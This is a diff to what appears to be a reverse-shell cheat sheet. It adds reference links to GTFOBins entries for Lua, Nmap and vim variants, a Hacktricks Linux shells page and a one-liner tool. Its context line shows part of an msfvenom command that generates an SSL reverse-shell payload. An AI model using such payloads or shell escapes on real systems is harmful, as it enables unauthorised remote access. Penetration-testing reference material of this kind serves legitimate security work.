@@ -25,6 +25,26 @@ $ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=[/path/to/file.pem] sslve
 ---
 ## References
 
+### GTFOBins
+
+- [GTFOBins: Lua](https://gtfobins.github.io/gtfobins/lua/)
+
+- [GTFOBins: Nmap](https://gtfobins.github.io/gtfobins/nmap/)
+
+- [GTFOBins: view](https://gtfobins.github.io/gtfobins/view/)
+
+- [GTFOBins: rview](https://gtfobins.github.io/gtfobins/rview/)
+
+- [GTFOBins: vim](https://gtfobins.github.io/gtfobins/vim/)
+
+- [GTFOBins: vimdiff](https://gtfobins.github.io/gtfobins/vimdiff/)
+
+- [GTFOBins: rvim](https://gtfobins.github.io/gtfobins/rvim/)
+
+### Hacktricks
+
 - [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+
+### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
